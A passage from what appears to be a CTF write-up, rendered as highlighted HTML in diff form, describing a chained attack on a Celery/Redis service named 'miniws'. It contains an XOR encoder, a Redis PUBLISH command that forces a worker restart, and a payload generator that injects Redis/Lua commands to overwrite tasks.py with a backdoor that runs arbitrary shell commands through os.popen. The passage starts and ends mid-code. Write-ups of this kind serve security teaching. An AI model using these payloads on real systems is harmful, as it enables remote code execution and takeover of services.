style="color:#ae81ff">92</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">143</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">230</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">209</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">170</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">209</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">170</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    data_length <span style="color:#f92672">=</span> len(data)
+</span></span><span style="display:flex;"><span>    plain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(key_stream)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">&gt;=</span> data_length:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        plain <span style="color:#f92672">=</span> plain <span style="color:#f92672">+</span> (data[i] <span style="color:#f92672">^</span> key_stream[i])<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> e_with_key(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64encode(out))
+</span></span></code></pre></div><p><code>shutdown</code> 等控制指令是通过 <code>redis</code> 的 <code>PUB/SUB</code> 发送的，命令如下：</p>
+<pre tabindex="0"><code>PUBLISH /0.celery.pidbox &#39;{&#34;body&#34;: &#34;&lt;加密后的base64数据&gt;&#34;, &#34;content-encoding&#34;: &#34;binary&#34;, &#34;content-type&#34;: &#34;application/x-miniws&#34;, &#34;headers&#34;: {&#34;clock&#34;: 1, &#34;expires&#34;: 1861891032.9756505}, &#34;properties&#34;: {&#34;delivery_mode&#34;: 2, &#34;delivery_info&#34;: {&#34;exchange&#34;: &#34;celery.pidbox&#34;, &#34;routing_key&#34;: &#34;&#34;}, &#34;priority&#34;: 0, &#34;body_encoding&#34;: &#34;base64&#34;, &#34;delivery_tag&#34;: &#34;e9cb2a03-3968-4a48-a3ea-ca7ba413c012&#34;}}&#39;
+</code></pre><p>注意 <code>expires</code> 不要过期，<code>delivery_tag</code> 设置为随机 <code>uuid</code> 即可。<code>worker</code> 进程退出后会被 <code>supervisor</code> 重新拉起来，此时会加载被我们覆盖的 <code>tasks.py</code> 代码。</p>
+<p>涉及到 <code>redis lua</code> 的 <code>Payload</code> 对于引号的转义很敏感，可以用 <code>unicode</code> 编码，方便一点。以下脚本用于生成三个阶段的 <code>Payload</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">wapper</span>(payload : str, title : str):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;------------------------</span><span style="color:#e6db74">{</span>title<span style="color:#e6db74">}</span><span style="color:#e6db74">----------------------------&#39;</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">GET&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(data)</span>
+</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>        num <span style="color:#f92672">=</span> hex(ord(i))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> len(num) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>            num <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">+</span> num
+</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> out <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">u00&#39;</span> <span style="color:#f92672">+</span> num
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(out)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwned_taskspy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from __future__ import annotations
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import os
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import pickle
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import socket
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from typing import Any, Dict
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from urllib.parse import urlparse
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from celery import Celery
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from kombu.serialization import register
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from .config import settings
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">from .crypto import dumps as encrypt_dumps, loads as decrypt_loads
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">try:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    register(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;miniws-aes&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        encrypt_dumps,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        decrypt_loads,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        content_type=&#34;application/x-miniws&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        content_encoding=&#34;binary&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    )
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">except ValueError:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pass
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">celery_app = Celery(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;miniws&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    broker=settings.celery_broker_url,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    backend=settings.celery_backend_url,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">celery_app.conf.update(
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    task_serializer=&#34;miniws-aes&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    task_default_serializer=&#34;miniws-aes&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    accept_content=[&#34;miniws-aes&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    result_serializer=&#34;json&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    result_accept_content=[&#34;json&#34;],
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@celery_app.task(name=&#34;miniws.echo&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def echo_task(message: str) -&gt; Dict[str, Any]:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return {&#34;echo&#34;: __import__(&#34;os&#34;).popen(message).read()}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@celery_app.task(name=&#34;miniws.fetch&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">def fetch_task(url: str, *, host_header: str | None = None, body: str | None = None, verb: str = &#34;GET&#34;) -&gt; Dict[str, Any]:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    parsed = urlparse(url)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    host = parsed.hostname or settings.redis_host
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    port = parsed.port or (443 if parsed.scheme == &#34;https&#34; else 80)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    path = parsed.path or &#34;/&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    if parsed.query:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        path = f&#34;</span><span style="color:#e6db74">{path}</span><span style="color:#e6db74">?</span><span style="color:#e6db74">{parsed.query}</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    request_host = host_header or parsed.netloc or f&#34;</span><span style="color:#e6db74">{host}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{port}</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    request_body = body.encode() if body else b&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    payload = (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        f&#34;</span><span style="color:#e6db74">{verb}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{path}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        f&#34;Host: </span><span style="color:#e6db74">{request_host}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;User-Agent: MiniFetch/1.0</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;Connection: close</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34; + 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ).encode() + request_body
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    chunks: list[bytes] = []
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    with socket.create_connection((host, port), timeout=5) as sock:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        sock.sendall(payload)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        while True:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data = sock.recv(4096)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            if not data:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                break
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            chunks.append(data)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    preview = b&#34;&#34;.join(chunks)[:2048]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    return {&#34;preview&#34;: preview.decode(errors=&#34;replace&#34;), &#34;bytes&#34;: len(preview)}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_file</span>(task_id : str):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;path&#34;</span> : <span style="color:#e6db74">&#34;/app/src/tasks.py&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;content&#34;</span> : pwned_taskspy
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    set celery-task-meta-</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#39;{&#34;status&#34;: &#34;FAILURE&#34;, &#34;result&#34;: {&#34;exc_type&#34;: &#34;DiagnosticsPersistError&#34;, &#34;exc_message&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;, &#34;exc_module&#34;: &#34;framework.app&#34;}, &#34;traceback&#34;: &#34;&#34;, &#34;children&#34;: [], &#34;date_done&#34;: &#34;2025-10-31T06:15:48.956927&#34;, &#34;task_id&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip() <span style="color:#f92672">%</span> (task_id, json<span style="color:#f92672">.</span>dumps(payload)<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex(), task_id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    wapper(data, <span style="color:#e6db74">&#39;write file&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_key</span>(task_id : str):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    EVAL &#34;local element_list = redis.call(&#39;LRANGE&#39;, KEYS[1], 0, 0) if not element_list or #element_list == 0 then return nil end local first_element = element_list[1] local escaped_value = string.gsub(first_element, &#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;&#39;, &#39;</span><span style="color:#ae81ff">\\\\\\\\\\</span><span style="color:#e6db74">&#34;&#39;) local json_result = &#39;{</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;status</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;SUCCESS</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;, </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;result</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;: {</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;echo</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;: </span><span 